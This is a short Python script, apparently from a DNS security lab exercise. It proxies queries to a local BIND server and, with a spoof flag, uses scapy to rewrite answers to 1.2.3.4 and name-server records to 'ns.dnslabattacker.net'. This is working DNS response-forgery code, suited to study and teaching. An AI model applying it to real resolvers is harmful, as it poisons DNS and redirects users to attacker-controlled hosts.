#!/usr/bin/env python
import argparse
import socket
from scapy.all import *

# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument("--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true", help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Port to run the proxy on
port = args.port
# BIND's port
dns_port = args.dns_port
# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response

ip_address = "1.2.3.4"
name_server = "ns.dnslabattacker.net"


print('dns-port: ', dns_port, 'port:', port)

local = "127.0.0.1"
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind((local, port))

while (1==1):
	query, query_address = sock.recvfrom(1024)
	sock.sendto(query, (local, dns_port))
	
	if SPOOF:
		answer, bind_adress = sock.recvfrom(1024)
		return_packet = DNS(answer)
		#print (return_packet.show())
		return_packet.an.rdata = ip_address
		

		num_ns = return_packet.nscount
		i = 0

		for i in range (num_ns):
			return_packet.ns['DNSRR'][i].rdata = name_server
		
		sock.sendto(bytes(return_packet), query_address)

	else :
		answer, bind_adress = sock.recvfrom(1024)
		sock.sendto(answer, query_address)